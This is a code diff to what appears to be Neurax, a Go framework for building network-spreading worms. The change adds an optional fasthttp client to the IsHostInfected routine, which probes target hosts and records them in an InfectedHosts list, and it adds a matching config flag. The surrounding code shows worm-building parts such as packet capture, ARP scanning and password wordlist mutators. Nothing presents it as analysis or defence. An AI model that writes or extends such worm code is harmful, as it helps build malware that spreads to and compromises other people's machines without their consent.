@@ -21,6 +21,7 @@ import (
 	"github.com/google/gopacket/pcap"
 	"github.com/mostlygeek/arp"
 	. "github.com/redcode-labs/Coldfire"
+	"github.com/valyala/fasthttp"
 	"github.com/yelinaung/go-haikunator"
 )
 
@@ -105,6 +106,7 @@ type __NeuraxConfig struct {
 	WordlistMutators   []string
 	AllocNum           int
 	Blacklist          []string
+	FastHTTP           bool
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -144,6 +146,7 @@ var NeuraxConfig = __NeuraxConfig{
 	WordlistMutators:   []string{"single_upper", "encapsule"},
 	AllocNum:           5,
 	Blacklist:          []string{},
+	FastHTTP:           false,
 }
 
 //Verbose error printing
@@ -286,14 +289,32 @@ func IsHostInfected(target string) bool {
 		return true
 	}
 	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.Port)
-	rsp, err := http.Get(target_url)
-	if err != nil {
+	if NeuraxConfig.FastHTTP {
+		req := fasthttp.AcquireRequest()
+		defer fasthttp.ReleaseRequest(req)
+		req.SetRequestURI(target_url)
+		resp := fasthttp.AcquireResponse()
+		defer fasthttp.ReleaseResponse(resp)
+		err := fasthttp.Do(req, resp)
+		if err != nil {
+			return false
+		}
+		if resp.StatusCode() == fasthttp.StatusOK {
+			InfectedHosts = append(InfectedHosts, target)
+			InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
+			return true
+		}
+	} else {
+		rsp, err := http.Get(target_url)
+		if err != nil {
+			return false
+		}
+		if rsp.StatusCode == 200 {
+			InfectedHosts = append(InfectedHosts, target)
+			InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
+			return true
+		}
 		return false
-	}
-	if rsp.StatusCode == 200 {
-		InfectedHosts = append(InfectedHosts, target)
-		InfectedHosts = RemoveFromSlice(InfectedHosts, GetLocalIp())
-		return true
 	}
 	return false
 }
